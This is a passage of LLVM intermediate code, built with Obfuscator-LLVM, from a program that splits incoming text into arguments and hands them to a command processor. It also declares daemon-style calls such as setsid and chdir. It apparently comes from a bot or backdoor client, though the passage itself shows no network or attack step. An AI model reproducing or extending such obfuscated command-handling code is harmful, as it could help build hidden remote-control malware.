  %361 = call i32 @fdpclose(i32 %360)
  call void @exit(i32 0) #14
  unreachable

; <label>:362:                                    ; preds = %332
  store i32 1, i32* %21, align 4
  %363 = load i8*, i8** %14, align 8
  %364 = call i8* @strtok(i8* %363, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.86, i32 0, i32 0)) #4
  store i8* %364, i8** %22, align 8
  %365 = load i8*, i8** %16, align 8
  %366 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 0
  store i8* %365, i8** %366, align 16
  br label %367

; <label>:367:                                    ; preds = %408, %362
  %368 = load i8*, i8** %22, align 8
  %369 = icmp ne i8* %368, null
  br i1 %369, label %370, label %410

; <label>:370:                                    ; preds = %367
  %371 = load i8*, i8** %22, align 8
  %372 = load i8, i8* %371, align 1
  %373 = zext i8 %372 to i32
  %374 = icmp ne i32 %373, 10
  br i1 %374, label %375, label %408

; <label>:375:                                    ; preds = %370
  %376 = load i8*, i8** %22, align 8
  %377 = call i64 @strlen(i8* %376) #10
  %378 = sub i64 0, %377
  %379 = sub i64 0, 1
  %380 = add i64 %378, %379
  %381 = sub i64 0, %380
  %382 = add i64 %377, 1
  %383 = call noalias i8* @malloc(i64 %381) #4
  %384 = load i32, i32* %21, align 4
  %385 = sext i32 %384 to i64
  %386 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 %385
  store i8* %383, i8** %386, align 8
  %387 = load i32, i32* %21, align 4
  %388 = sext i32 %387 to i64
  %389 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 %388
  %390 = load i8*, i8** %389, align 8
  %391 = load i8*, i8** %22, align 8
  %392 = call i64 @strlen(i8* %391) #10
  %393 = sub i64 %392, -889668948185473294
  %394 = add i64 %393, 1
  %395 = add i64 %394, -889668948185473294
  %396 = add i64 %392, 1
  call void @llvm.memset.p0i8.i64(i8* %390, i8 0, i64 %395, i32 1, i1 false)
  %397 = load i32, i32* %21, align 4
  %398 = sext i32 %397 to i64
  %399 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 %398
  %400 = load i8*, i8** %399, align 8
  %401 = load i8*, i8** %22, align 8
  %402 = call i8* @strcpy(i8* %400, i8* %401) #4
  %403 = load i32, i32* %21, align 4
  %404 = sub i32 %403, 512371523
  %405 = add i32 %404, 1
  %406 = add i32 %405, 512371523
  %407 = add nsw i32 %403, 1
  store i32 %406, i32* %21, align 4
  br label %408

; <label>:408:                                    ; preds = %375, %370
  %409 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.86, i32 0, i32 0)) #4
  store i8* %409, i8** %22, align 8
  br label %367

; <label>:410:                                    ; preds = %367
  %411 = load i32, i32* %21, align 4
  %412 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i32 0, i32 0
  call void @processCmd(i32 %411, i8** %412)
  %413 = load i32, i32* %21, align 4
  %414 = icmp sgt i32 %413, 1
  br i1 %414, label %415, label %432

; <label>:415:                                    ; preds = %410
  store i32 1, i32* %23, align 4
  store i32 1, i32* %23, align 4
  br label %416

; <label>:416:                                    ; preds = %425, %415
  %417 = load i32, i32* %23, align 4
  %418 = load i32, i32* %21, align 4
  %419 = icmp slt i32 %417, %418
  br i1 %419, label %420, label %431

; <label>:420:                                    ; preds = %416
  %421 = load i32, i32* %23, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 %422
  %424 = load i8*, i8** %423, align 8
  call void @free(i8* %424) #4
  br label %425

; <label>:425:                                    ; preds = %420
  %426 = load i32, i32* %23, align 4
  %427 = sub i32 %426, 1754610936
  %428 = add i32 %427, 1
  %429 = add i32 %428, 1754610936
  %430 = add nsw i32 %426, 1
  store i32 %429, i32* %23, align 4
  br label %416

; <label>:431:                                    ; preds = %416
  br label %432

; <label>:432:                                    ; preds = %431, %410
  br label %433

; <label>:433:                                    ; preds = %432, %223
  br label %101

; <label>:434:                                    ; preds = %101
  %435 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.87, i32 0, i32 0))
  br label %91
                                                  ; No predecessors!
  %437 = load i32, i32* %3, align 4
  ret i32 %437
}

; Function Attrs: nounwind
declare i32 @setsid() #3

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

declare i32 @printf(i8*, ...) #5

declare i32 @sleep(i32) #5

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind }
attributes #5 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146633309}
!2 = !{i32 -2146632618}
!3 = !{i32 -2146631869}
!4 = !{i32 -2146631046}
!5 = !{i32 -2146630236}
!6 = !{i32 -2146628811}
!7 = !{i32 -2146627949}
!8 = !{i32 -2146627228}
